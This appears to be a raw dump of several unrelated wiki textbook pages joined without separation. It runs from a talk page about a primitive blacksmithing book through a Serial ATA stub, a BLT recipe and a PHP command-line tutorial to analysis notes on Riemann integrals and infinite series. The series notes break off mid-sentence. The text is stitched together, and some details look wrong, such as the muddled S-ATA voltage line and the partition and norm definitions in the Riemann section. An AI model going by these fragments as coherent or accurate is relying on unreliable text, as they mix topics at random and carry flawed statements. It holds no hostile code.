My further hope is that some of the other smiths on the web will eventually find this and contribute, not only to this book and wikipedia, but perhaps more and more specialized modules on various processes, tools, materials and the like.
I want to emphasize that in this book what should be covered is ''a'' way to do things. Not ''the'' way. Not even, necessarily the ''best'' way. What is described at points may be very localized and specific. 
I believe that if it is basic and essential enough in descriptions those who are interested and motivated will be able to make appropriate substitutions to suit their environment.
A secondary but still significant goal is that there are enough links and cross references to existing resources on Wiki and externally that one more starting point for this in the internet is created. 
Yet another goal is that this is modular enough and motivating enough that others are motivated to assist in filling the gaps that must exist in a topic like this.

== Nice start ==

Erraunt, this is a nice start.  I made a few minor changes to some of the sentences, and some spelling changes as well.  This is an interesting topic and I hope to see more soon.  Thanks for your work. --[[User:Vern|Vern]] 19:45, 8 Mar 2005 (UTC)
Thanks, Vern. Your changes are appreciated. I'm passing the word to some of my smithing friends as well. The more input the better. Even starting to daydream a bit about what will follow. I look forward to this growing and to whatever you might choose to offer. --[[User:erraunt|erraunt]]

== Continuing the work ==

I fleshed out some of the earlier sections quite a bit and started putting in more links back to Blacksmithing and Metalworking in Wikipedia.

I hope to get to the &quot;Building&quot; and initial projects pages in the next two weeks.

I don't want to restrict anyone from contributing to this in the slightest but I would ask if you're going to add significantly to this book that you read the introduction and objectives and consider keeping what you add in line with the goal of a simple, primitive forge and anvil as the basis for what is accomplished here. 

I don't want to exclude such additions but that is why I chose &quot;Down'n'Dirty&quot; for the title and guiding philosophy. If there is interest I  have interest in a second book with more advanced techniques using more refined tools made or otherwise acquired. 

But the goal here is to let someone have a taste and do some basic work with the least outlay possible so that they could decide if it was for them and worth the investment in proper anvil, leg vice, forge, bellows and the like.

My other hope is that once the weather warms (it's early March and I'm in Minneapolis as I write this) a few of us can get together and actually work through what is here with a camera present both to test the content and to create images to illustrate the process.
[[User:Erraunt|erraunt]]

== If You are Willing to Help ... ==

I've got a fairly clear idea of where I want to go with the body of this book. 

If you're inclined and have a little time, things that would be really helpful would be:

1) checking Wikipedia for useful entries to link to from this book. &lt;i&gt; The more that we can use other modules from elsewhere in the Wiki world the more time there is for writing on new things.&lt;i&gt;

2) Creating or expanding Wikipedia entries where there are none or only stubs. For example, while there is a Wikipedia entry for &quot;hammers&quot; it wasn't linked to Metalworking and didn't include cross-peen hammers. So I've added cross-peen to hammers (but it's a stub) and put a link to &quot;hammers&quot; in &quot;Metalwork&quot;. Things like that would be great.

3) I'm not sure where it would best be put but creating a bibliography of good books on blacksmithing would be outstanding. Please add your favorites. Probably in the Wikipedia entry on Blacksmithing would be best.

4) If you have any photographs of blacksmith tools, or know where public domain images of the same are available, that would be really great. Writing about blacksmithing is a poor third best to hands on. Photographs and sketches will work to bring this to &quot;second best&quot; which is about the best we can do in a 2 dimensional medium (although I'll admit I daydream about a VR smithy ... ). 

5) If you have worked a primitive forge or try any of the projects and such in here, please feed back your results and questions. I'd love to hear about it either here or in a direct e-mail.

Thanks to those who have contributed by direct editing or stopping by!

== More additons, Contemplated Changes ==

Added more text today. 

Realized that it's beyond 32 KB (or MB?) and that might be too much for some browsers.

Should break out some of the sections and link to them. That will have to be a project for another day.

Apologies to any who try to edit it until I get to that.

[[User:Erraunt|erraunt]]

== Break Out into Modules ==

Got the message this weekend that the main book is now over 32 KB and could cause problems for some browsers.

This combined with my growing feeling that the size is getting cumbersome has got me thinking about ways to modularize this work.

My current thought is to migrate this toward a main heading on the bookshelf of &quot;Blacksmithing&quot;. &quot;Down'n'Dirty Blacksmithing&quot; will be one title under that.

The excercises and projects will be modules as links from the core book. 

Ultimately this will be both easier to edit and more useful. 

I'm giving thought to an organization and will post that in a few days (hopefully).

If others have thoughts, please comment.  --[[User:Erraunt|Erraunt]], ~Mar ***, 2005

Hi.  I've split the tools section from this book, probably will do more.  Very interesting and informative book, by the way.  I used to be really interested in blacksmithing, ~12 years ago(8yrsOld).  It's probably illegal here though.  And it sounds hard to forge circuitry.. [[User:Snargle|Snargle]] 04:44, 1 August 2005 (UTC)

Thanks for your interest, Snargle. I hope to do more with it when not quite so busy. [[User:Erraunt|erraunt]] 15:37, 30 August 2005 (UTC)

== Images ==
I've found a picture source on http://commons.wikimedia.org/wiki/Category:Smiths --[[User:Snargle|Snargle]] 09:53, 1 August 2005 (UTC)

== Added a bit on &quot;Drawing&quot;... ==

...which I hope is not taken amiss.  My technical skill (as a smith) are pretty weak, but I've made almost every mistake you can (but no severe burns!).

Thanks for doing this, I hope I can help and that it is taken as such, not as an intrusion.

== Comment == 

Hi there. This book looks interesting, and very well written. I myself am currently working on the [[Welding]] wikibook, but it is going fairly slow... Its just me writing it so far. I came around searching for blacksmithing (as I am writing a 'history' section in mine,) and I found lots, but not really history. Anyway, wonderful topic, great job!

== Introduction ==

S-ATA or Serial ATA

Is a new technology to replace the P-ATA or parallel ATA.

It has the following advantages:

* less power consumption 500 millivolts in P_ATA 5 volts.
* easy to install, without seting master and slave.
* good air movement replacing ribbon cable to guarantee good air flow.

{{recipe}} | [[Cookbook:Sandwiches|Sandwiches]]

The '''b'''acon, '''l'''ettuce and '''t'''omato sandwich, commonly referred to as the '''BLT''', is a classic sandwich that can be found almost everywhere.

==Ingredients==
*[[Cookbook:Bacon|bacon]], sliced in rashers
*[[Cookbook:Lettuce|lettuce]], washed and shredded, torn, or in whole leaves
*ripe [[Cookbook:Tomato|tomato]], sliced into thin disks
*two slices of any type of [[Cookbook:Bread|bread]]
*sandwich spread or condiments (e.g., [[Cookbook:Butter|butter]], [[Cookbook:Margarine|margarine]], [[Cookbook:Mayonnaise|mayonnaise]], [[Cookbook:Cream Cheese|cream cheese]], or [[Cookbook:mustard|mustard]], although mayonnaise is traditional)
*ground [[Cookbook:Pepper|black pepper]], if desired

==Procedures==
#[[Cookbook:Toasting|Toast]] the two slices of bread.
#While the bread is toasting [[Cookbook:Broiling|broil]] or [[Cookbook:Frying|fry]] the bacon until crisp, taking care not to burn it.
#Once the toasted bread is ready, spread with desired condiments.
#Layer one slice of toast with the lettuce, tomato slices, and bacon. Add black pepper as desired. Top with other slice of toast.
#Cut into triangles or halves as preferred. Serve ''immediately''.

==Notes, tips, and variations==
*The lettuce, if shredded, may be mixed with the mayonnaise before layering the toast.
*The lettuce may be omitted, or another green substituted. [[Cookbook:watercress|Watercress]] is a nice addition.
*You may add slivers of ripe [[Cookbook:avocado|avocado]] or raw or cooked red [[Cookbook:onion|onion]] to the sandwich, or may substitute them for the lettuce or tomato.
*You may top the hot bacon in the sandwich with a slice of [[Cookbook:cheese|cheese]], such as cheddar, American, muenster, or pepper jack, or use it to replace the tomato (a sandwich prepared in this way is called a BLC sandwich, for &quot;bacon, lettuce, and cheese.&quot;)
*You may place a fried [[Cookbook:egg|egg]] in the sandwich. If the egg is fried over-easy or sunny-side-up, the egg's [[Cookbook:Egg yolk|yolk]] may be broken just before serving so that it dresses the contents of the sandwich. 
*The slices of bread do not need to be toasted, although toast adds a nice texture.
*You may spread the bread with [[Cookbook:Peanut Butter|peanut butter]] for an interesting variation.
*You may top the sandwich or its contents with [[Cookbook:Hollandaise Sauce|hollandaise sauce]].
*Add [[Cookbook:ham|ham]], [[Cookbook:turkey|turkey]] and [[Cookbook:Swiss Cheese|Swiss cheese]] for a BLT club sandwich.
*For a [[Cookbook:vegan|vegan]] variation on the BLT, use marinated and fried or grilled strips of [[Cookbook:tempeh|tempeh]] to substitute for the bacon. Vegetable protein-based false bacon products are also available in some grocery freezers. Use mayonnaise, a vegan mayonnaise substitute, in place of the mayo.
*A BLT sandwich can also be served on a (non-toasted) hot dog bun or larger variation thereof (although in this case the bacon, lettuce, and tomato should all be shredded.)

==Warnings==
Take care when frying the bacon to avoid a grease fire. (Should one occur, '''do not''' douse the flames with water, as this will cause the fire to spread; instead, cover the pan tightly or heap with baking soda to smother the flames, and remove from the heat.)

      <text xml:space="preserve">Back to [[PHP Programming|PHP]]

Contrary to popular belief, PHP is not just a web server language.  PHP can also be used to create ''regular'' programs.  PHP can be used to create GUI applications, shell scripts, and even daemons, among other things.

The boon is that all (or most) of the usual PHP libraries are available to your PHP CLI program too.  MySQL, XML, etc.  It's all (or mostly) still available.

== Example PHP-CLI Program ==
Below is an example PHP-CLI program:

 &lt;nowiki&gt;&lt;?php
  print('Hello World');
 ?&gt;&lt;/nowiki&gt;

If we saved this as &quot;helloworld.php&quot;, then we'd run this PHP CLI program via the command:
 php helloworld.php
This would produce the output:
 Hello World

== Difference Between PHP and PHP CLI ==
There are some important differences between ''server-side'' PHP and PHP CLI.  Here's a list of them:
# There is no &lt;code&gt;$_GET&lt;/code&gt; super global array.
# There is no &lt;code&gt;$_POST&lt;/code&gt; super global array.
# There is no &lt;code&gt;$_COOKIE&lt;/code&gt; super global array.
# When you do a ''print'', the output goes to the ''standard output'' and not a web browser.
# You can get ''command line arguments'' via the &lt;code&gt;$argv&lt;/code&gt; variable.
# You can get the ''number of command line arguments'' via the &lt;code&gt;$argc&lt;/code&gt; variable.

== Using &lt;code&gt;argv&lt;/code&gt; and &lt;code&gt;argc&lt;/code&gt; ==
Like many programs, it is necessary to access the command line variable used to invoke the program.  To do this in PHP we have two variables:

With &lt;code&gt;register_globals = on;&lt;/code&gt; in the php.ini file one can use:
* &lt;code&gt;$argv&lt;/code&gt;
* &lt;code&gt;$argc&lt;/code&gt;

With &lt;code&gt;register_globals = off;&lt;/code&gt; in the php.ini file one can use:
* &lt;code&gt;$_SERVER['argv']&lt;/code&gt;
* &lt;code&gt;$_SERVER['argc']&lt;/code&gt;

(For those know Bash, C or C++ program languages. they'll find these pair of variables to be very familiar)

Below is an program that makes use of the &lt;code&gt;$argc&lt;/code&gt; and &lt;code&gt;$argv&lt;/code&gt; variables:

 &lt;nowiki&gt;&lt;?php 
  print('ARGC = ' . $argc .&quot;\n\n&quot;);
  foreach ($argv as $k=&gt;$v) {
    print(&quot;ARGV[$k] = $v\n&quot;);
  }
 ?&gt;&lt;/nowiki&gt;

 &lt;nowiki&gt;&lt;?php 
  print('ARGC = ' . $_SERVER['argc'] .&quot;\n\n&quot;);
  foreach ($_SERVER['argv'] as $k =&gt; $v) {
    print(&quot;ARGV[$k] = $v\n&quot;);
  }
 ?&gt;&lt;/nowiki&gt;

If we save this PHP program as &quot;test1.php&quot;, and ran it with:
    php test1.php apple orange banana pineapple
Then we'd get:
    ARGC = 4
    
    ARGV[0] = test1.php
    ARGV[1] = apple
    ARGV[2] = orange
    ARGV[3] = banana
    ARGV[4] = pineapple

(Note that like in Bash, C and C++ programs, the first element of &lt;code&gt;$argv&lt;/code&gt; is the name of the program.)

==Definition==

Riemann integration is the formulation of integration most people think of if they ever think about integration. It is the only type of integration considered in most calculus classes; many other forms of integration, notably Lebesgue integrals, are extensions of Riemann integrals to larger classes of functions. The Riemann integral was developed by [[w:Bernhard Riemann|Bernhard Riemann]] in 1854 and was, when invented, the first rigorous definition of integration applicable to not necessarily continuous functions.

We will first define some preliminary ideas.

==Partitions==
===Definition===
Let &lt;math&gt;a,b\in\mathbb{R}&lt;/math&gt;

A '''Partition''' &lt;math&gt;\mathcal{P}&lt;/math&gt; is defined as the ordered ''n-tuple'' of real numbers &lt;math&gt;\mathcal{P}=(x_0,x_1,x_2,\ldots ,x_n)&lt;/math&gt; such that &lt;math&gt;a&lt;x_0&lt;x_1&lt;x_2&lt;\ldots &lt;x_n&lt;b&lt;/math&gt;

===Norm of a Partition===
Let &lt;math&gt;\mathcal{P}&lt;/math&gt; be a partition given by &lt;math&gt;\mathcal{P}=(x_0,x_1,x_2,\ldots ,x_n)&lt;/math&gt;

Then, the '''Norm''' (or the &quot;mesh&quot;) of &lt;math&gt;\mathcal{P}&lt;/math&gt; is defined as &lt;math&gt;\|\mathcal{P}\| =\sup \{x_{k+1}-x_k|1\leq k\leq n-1\}&lt;/math&gt;

===Tagged Partition===
Let &lt;math&gt;\mathcal{P}=(x_0,x_1,x_2,\ldots ,x_n)&lt;/math&gt; be a partition

A '''Tagged Partition''' &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; is defined as the set of ordered pairs &lt;math&gt;\mathcal{\dot{P}}=\{([x_{i-1},x_i],t_i)\}_{i=1}^n&lt;/math&gt; such that &lt;math&gt;x_{i-1}&lt;t_i&lt;x_i&lt;/math&gt;. The points &lt;math&gt;t_i&lt;/math&gt; are called '''Tags'''.

==Riemann==
[[Image:Integral Riemann sum.png|thumb|180px|Riemann sum of a function]]
===Riemann Sums===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;

Let &lt;math&gt;\mathcal{\dot{P}}=\{([x_{i-1},x_i],t_i)\}_{i=1}^n&lt;/math&gt; be a tagged partition of &lt;math&gt;[a,b]&lt;/math&gt;

The '''Riemann Sum''' of &lt;math&gt;f&lt;/math&gt; over &lt;math&gt;[a,b]&lt;/math&gt; with respect to &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; is given by

&lt;math&gt;S(f,\mathcal{\dot{P}})=\displaystyle\sum_{i=1}^n f(t_i)(x_i-x_{i-1})&lt;/math&gt;

===Riemann Integral===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;

Let &lt;math&gt;L\in\mathbb{R}&lt;/math&gt;

We say that &lt;math&gt;f&lt;/math&gt; is '''Integrable''' on &lt;math&gt;[a,b]&lt;/math&gt; if and only if for every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt;, there exists &lt;math&gt;\delta&gt;0&lt;/math&gt; such that for every partition &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt;, we have that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|&lt;\varepsilon&lt;/math&gt;

&lt;math&gt;L&lt;/math&gt; is said to be the '''integral''' of &lt;math&gt;f&lt;/math&gt; over &lt;math&gt;[a,b]&lt;/math&gt;, and is written as 

&lt;math&gt;L=\int_a^b f(x)dx&lt;/math&gt; or as &lt;math&gt;L=\int_a^b f&lt;/math&gt;

==Properties==
===Theorem (Uniqueness)===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt; be integrable on &lt;math&gt;[a,b]&lt;/math&gt;

Then the integral &lt;math&gt;L&lt;/math&gt; of &lt;math&gt;f&lt;/math&gt; is unique
====Proof====
Assume, if possible that &lt;math&gt;L_1\neq L_2&lt;/math&gt; are both integrals of &lt;math&gt;f&lt;/math&gt; over &lt;math&gt;[a,b]&lt;/math&gt;. Consider &lt;math&gt;\varepsilon=\tfrac{|L_1-L_2|}{2}&lt;/math&gt;

As &lt;math&gt;L_1,L_2&lt;/math&gt; are integrals, there exist &lt;math&gt;\delta_1,\delta_2&gt;0&lt;/math&gt; such that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L_1|&lt;\varepsilon&lt;/math&gt; for all &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; that satisfy &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta_1&lt;/math&gt; and &lt;math&gt;|S(f,\mathcal{\dot{P}})-L_2|&lt;\varepsilon&lt;/math&gt; for all &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; that satisfy &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta_2&lt;/math&gt;

Let &lt;math&gt;\delta=\inf\{\delta_1,\delta_2\}&lt;/math&gt;. Hence, if &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; is a partition satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt;, then we have &lt;math&gt;|S(f,\mathcal{\dot{P}})-L_1|&lt;\varepsilon&lt;/math&gt; and that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L_2|&lt;\varepsilon&lt;/math&gt;

That is, &lt;math&gt;|L_1-L_2|&lt;2\varepsilon =|L_1-L_2|&lt;/math&gt;, which is an obvious contradiction. Hence the integral &lt;math&gt;L&lt;/math&gt; of &lt;math&gt;f&lt;/math&gt; is unique.


We now state (without proof) two seemingly obvious properties of the integral.

===Theorem===
Let &lt;math&gt;f,g:[a,b]\to\mathbb{R}&lt;/math&gt; be integrable and let &lt;math&gt;c\in (a,b)&lt;/math&gt;

Then:

(i)&lt;math&gt;\int_a^b f+\int_a^b g=\int_a^b f+g&lt;/math&gt;

(ii)&lt;math&gt;\int_a^c f+\int_c^b f=\int_a^b f&lt;/math&gt;

===Theorem (Boundedness Theorem)===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt; be Riemann integrable. Then, &lt;math&gt;f&lt;/math&gt; is bounded over &lt;math&gt;[a,b]&lt;/math&gt;
====Proof====
Assume if possible that &lt;math&gt;f&lt;/math&gt; is unbounded. For every &lt;math&gt;n\in\mathbb{N}&lt;/math&gt; divide the interval &lt;math&gt;[a,b]&lt;/math&gt; into &lt;math&gt;n&lt;/math&gt; parts. Hence, for every &lt;math&gt;n\in\mathbb{N}&lt;/math&gt;, &lt;math&gt;f&lt;/math&gt; is unbounded on at least one of these &lt;math&gt;n&lt;/math&gt; parts. Call it &lt;math&gt;I_n&lt;/math&gt;. 

Now, let &lt;math&gt;\varepsilon&gt;0&lt;/math&gt; be given. Consider an arbitrary &lt;math&gt;\delta&gt;0&lt;/math&gt;. Let &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; be a tagged partition such that &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt; and &lt;math&gt;(I_n,t_n)\in\mathcal{\dot{P}}&lt;/math&gt;, where &lt;math&gt;t_n&lt;/math&gt; is taken so as to satisfy &lt;math&gt;|f(t_n)|&gt;n\varepsilon&lt;/math&gt;. 

Thus we have that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|&gt;\varepsilon&lt;/math&gt;. But as &lt;math&gt;\delta&gt;0&lt;/math&gt; is arbitrary, we have a contradiction to the fact that &lt;math&gt;f&lt;/math&gt; is Riemann integrable.

Hence, &lt;math&gt;f&lt;/math&gt; is bounded.

==Integrability==
We now study classes of Riemann integrable functions. The first &quot;constraint&quot; on Riemann integrable functions is provided by the Cauchy Integrability Criterion.
 
===Theorem (Cauchy Criterion)===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;

Then, 

(i)&lt;math&gt;f&lt;/math&gt; is Riemann integrable on &lt;math&gt;[a,b]&lt;/math&gt; if and only if 

(ii) For every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt;, there exists &lt;math&gt;\delta&gt;0&lt;/math&gt; such that if &lt;math&gt;\mathcal{\dot{P}},\mathcal{\dot{Q}}&lt;/math&gt; are two partitions satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|,\|\mathcal{\dot{Q}}\|&lt;\delta&lt;/math&gt; then &lt;math&gt;|S(f,\mathcal{\dot{P}})-S(f,\mathcal{\dot{Q}})|&lt;\varepsilon&lt;/math&gt;
====Proof====
(&lt;math&gt;\Rightarrow&lt;/math&gt;)Let &lt;math&gt;\int_a^b f=L&lt;/math&gt; and let &lt;math&gt;\varepsilon&gt;0&lt;/math&gt; be given. 

Then, there exists &lt;math&gt;\delta&gt;0&lt;/math&gt; such that for every partition &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt;,we have &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|&lt;\tfrac{\varepsilon}{2}&lt;/math&gt;

Now, let partitions &lt;math&gt;\mathcal{\dot{P}},\mathcal{\dot{Q}}&lt;/math&gt; be such that &lt;math&gt;\|\mathcal{\dot{P}}\|,\|\mathcal{\dot{Q}}\|&lt;\delta&lt;/math&gt;. 

Thus we have that &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|,|S(f,\mathcal{\dot{Q}})-L|&lt;\tfrac{\varepsilon}{2}&lt;/math&gt;, that is &lt;math&gt;|S(f,\mathcal{\dot{P}})-S(f,\mathcal{\dot{Q}})|&lt;\varepsilon&lt;/math&gt;

(&lt;math&gt;\Leftarrow&lt;/math&gt;) For every &lt;math&gt;n\in\mathbb{N}&lt;/math&gt;, consider &lt;math&gt;\delta_n&gt;0&lt;/math&gt; such that for all partitions &lt;math&gt;\mathcal{\dot{P}},\mathcal{\dot{Q}}&lt;/math&gt; satisfying &lt;math&gt;\|\mathcal{\dot{P}}\|,\|\mathcal{\dot{Q}}\|&lt;\delta_n&lt;/math&gt;, we have &lt;math&gt;|S(f,\mathcal{\dot{P}})-S(f,\mathcal{\dot{Q}})|&lt;\tfrac{1}{n}&lt;/math&gt;. 

Without loss of generality, we can assume that &lt;math&gt;\delta_m&gt;\delta_n&lt;/math&gt; when &lt;math&gt;m&lt;n&lt;/math&gt;. For every &lt;math&gt;\delta_n&lt;/math&gt;, let &lt;math&gt;\mathcal{\dot{P}}_n&lt;/math&gt; be a partition such that &lt;math&gt;\|\mathcal{\dot{P}}_n\|&lt;\delta_n&lt;/math&gt;

The sequence &lt;math&gt;a_n=S(f,\mathcal{\dot{P}}_n)&lt;/math&gt; is a Cauchy sequence, and hence it has a limit &lt;math&gt;L\in\mathbb{R}&lt;/math&gt;. 

Now, for every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt;, we have a &lt;math&gt;\delta&gt;0&lt;/math&gt; such that &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta&lt;/math&gt; implies &lt;math&gt;|S(f,\mathcal{\dot{P}})-L|&lt;\varepsilon&lt;/math&gt;.

Thus &lt;math&gt;\int_a^b f=L&lt;/math&gt;

===Theorem (Squeeze Theorem)===
Let &lt;math&gt;f:[a,b]\to\mathbb{R}&lt;/math&gt;

Then,

(i) &lt;math&gt;f&lt;/math&gt; is Riemann integrable on &lt;math&gt;[a,b]&lt;/math&gt; if and only if 

(ii) For every &lt;math&gt;\varepsilon&gt;0&lt;/math&gt;, there exist &lt;u&gt;Riemann integrable&lt;/u&gt; functions &lt;math&gt;\alpha_{\varepsilon},\omega_{\varepsilon}:[a,b]\to\mathbb{R}&lt;/math&gt; such that 

&lt;math&gt;\alpha_{\varepsilon}(x)\leq f(x)\leq\omega_{\varepsilon}(x)&lt;/math&gt; for all &lt;math&gt;x\in[a,b]&lt;/math&gt; and

&lt;math&gt;\int_a^b (\omega_{\varepsilon}-\alpha_{\varepsilon})&lt;\varepsilon&lt;/math&gt;
====Proof====
(&lt;math&gt;\Rightarrow&lt;/math&gt;)Take &lt;math&gt;\alpha_{\varepsilon}(x)=f(x)=\omega_{\varepsilon}(x)&lt;/math&gt;. It is easy to see that &lt;math&gt;\int_a^b (\omega_{\varepsilon}-\alpha_{\varepsilon})&lt;\varepsilon&lt;/math&gt;

(&lt;math&gt;\Leftarrow&lt;/math&gt;)Let &lt;math&gt;n\in\mathbb{N}&lt;/math&gt;. Then, there exist functions &lt;math&gt;\alpha_n,\omega_n&lt;/math&gt; such that &lt;math&gt;\int_a^b (\omega_n-\alpha_n)&lt;\tfrac{1}{n}&lt;/math&gt;. Further, if &lt;math&gt;\int_a^b \alpha_n=A_n&lt;/math&gt; and &lt;math&gt;\int_a^b \omega_n=Z_n&lt;/math&gt;, then there exist &lt;math&gt;\delta_1,\delta_2&gt;0&lt;/math&gt; such that if a partition &lt;math&gt;\mathcal{\dot{P}}&lt;/math&gt; satisfies &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta_1&lt;/math&gt; then &lt;math&gt;|S(\alpha_n,\mathcal{\dot{P}})-A_n|&lt;\tfrac{1}{n}&lt;/math&gt; and &lt;math&gt;\|\mathcal{\dot{P}}\|&lt;\delta_2&lt;/math&gt; then &lt;math&gt;|S(\omega_n,\mathcal{\dot{P}})-Z_n|&lt;\tfrac{1}{n}&lt;/math&gt;

Now let &lt;math&gt;\mathcal{\dot{P}}_n&lt;/math&gt; be an interval satisfying &lt;math&gt;\|\mathcal{\dot{P}}_n\|&lt;\inf \{\delta_1,\delta_2\}&lt;/math&gt;. 

Now, we can easily see that &lt;math&gt;|S(f,\mathcal{\dot{P}}_n)-S(f,\mathcal{\dot{P}}_{n-1})|&lt;\tfrac{1}{n}&lt;/math&gt;. Hence, &lt;math&gt;S(f,\mathcal{\dot{P}}_n)&lt;/math&gt; is a Cauchy sequence, with a limit &lt;math&gt;L\in\mathbb{R}&lt;/math&gt;, and as in the previous proof, we can show that &lt;math&gt;\int_a^b f=L&lt;/math&gt;</text>

Frequently in analysis it is useful to consider the sum of infinitely many numbers.  So for some sequence of numbers (''a''&lt;sub&gt;''n''&lt;/sub&gt;) we may want to consider expressions like 
:&lt;math&gt;\sum_{n=1}^\infty a_n&lt;/math&gt;.

But the exact meaning of this may not be immediately clear.  Intuitively we would like to say that the sum of infinitely many numbers should be the number we get close to after we have summed a large number of terms.  We will use the notion of the limit of a sequence to make this precise.  The standard terminology in the study of series sometimes has room for improvement, but we follow the standard terminology in this section.  

==Definition==
We begin with a sequence (''a''&lt;sub&gt;''n''&lt;/sub&gt;) of the numbers we would like to sum.

:'''Definition''' A '''series''' of real numbers is an infinite formal sum
::&lt;math&gt;\sum_{n=1}^\infty a_n&lt;/math&gt;
:where each '''term''' ''a''&lt;sub&gt;''n''&lt;/sub&gt; is a real number.

This definition deserves a few comments.  The first is that it that no attempt is being made to define a formal sum.  It is possible to define a formal sum simply as the sequence of terms, but this doesn't add any clarity to the discussion.  
The reason for allowing the series to be formal is merely a matter of convenience.  It is frequently easier to refer to a series before it as been determined if there is any number that should represent the sum.  This is very similar to the standard practice of saying  &lt;math&gt;\textstyle \lim_{n\to\infty}a_n&lt;/math&gt; does not exists, we have only defined the meaning of the symbols &lt;math&gt;\textstyle \lim_{n\to\infty}a_n&lt;/math&gt; in the case when the limit does exist.  We should instead say that the sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt; does not converge.  However the meaning of the previous statement is perfectly clear.
  
:'''Definition''' The ''n''-th '''partial sum''' of a sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt; is defined to be the sum of the first ''n'' terms of (''a''&lt;sub&gt;''n''&lt;/sub&gt;), that is 
::&lt;math&gt;S_n=\sum_{i=1}^n a_i=a_1+a_2+\cdots+a_n&lt;/math&gt;.
:When the sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt; is being thought of as the terms of a series, then ''S''&lt;sub&gt;''n''&lt;/sub&gt; is often called the ''n''-th partial sum ''of the series.''

Often several partial sums may appear in the same argument, so  the partial sum is often written simply as &lt;math&gt;\sum_{i=1}^n a_i&lt;/math&gt; instead of ''S''&lt;sub&gt;''n''&lt;/sub&gt; when we wish to avoid confusion.

:'''Definition''' For a series &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; we define the  '''sum''' of the series to be the limit of the partial sums.  That is, we ''define'': 
::&lt;math&gt; \sum_{n=1}^{\infty} a_{n}=\lim_{N\to\infty} \sum_{n=1}^N a_n=\lim_{N\to\infty}S_N&lt;/math&gt;.
:If the limit exists we say the series '''converges''', otherwise we say the series '''diverges'''.

It should be emphasized when a series diverges, we cannot interpret &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; as a number, but only as a formal sum.  On the other hand when the series does converge, it is often not known what number the series converges to, so this number is usually denoted by &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt;.  Again this is similar to writing &lt;math&gt;\textstyle \lim_{n\to\infty}a_n&lt;/math&gt; before the convergence of the sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt; is established.  In practice the meaning of the symbols &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; is clear from context.      

Often it is convenient to sum series starting from some number other than ''n''&amp;nbsp;=&amp;nbsp;1, and start the series some other point like 0, 2, &amp;minus;10, etc.  This hopefully should cause no confusion, the sum of the series is still defined as the limit of the partial sums.  Often it is sometimes clear from context where the sum begins, in these cases it is not uncommon to leave the index out of the sigma notation, that is it is useful to write &amp;sum;''a''&lt;sub&gt;''n''&lt;/sub&gt; for &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt;

==Examples==
&lt;ul&gt;
&lt;li&gt;The notion of an infinite sum can be a little more subtle than it first appears.  For example, consider the sequence ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;=&amp;nbsp;(&amp;minus;1)&lt;sup&gt;''n''&lt;/sup&gt;.  
Does the sum of the ''a''&lt;sub&gt;''n''&lt;/sub&gt; converge or diverge?  We could consider the partial sums  are ''S''&lt;sub&gt;''N''&lt;/sub&gt; which are 1 if ''N'' is odd and 0 if ''N'' is even. So it seems the series diverges. On the other hand 1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;…&amp;nbsp;=&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;…&amp;nbsp;=&amp;nbsp;0&amp;nbsp;+&amp;nbsp;0&amp;nbsp;+&amp;nbsp;0&amp;nbsp;+&amp;nbsp;…&amp;nbsp;=&amp;nbsp;0.  Does our theory say the series diverges or does it converge to 0?  The answer is it diverges, the fallacy in the previous sentence was in asserting that 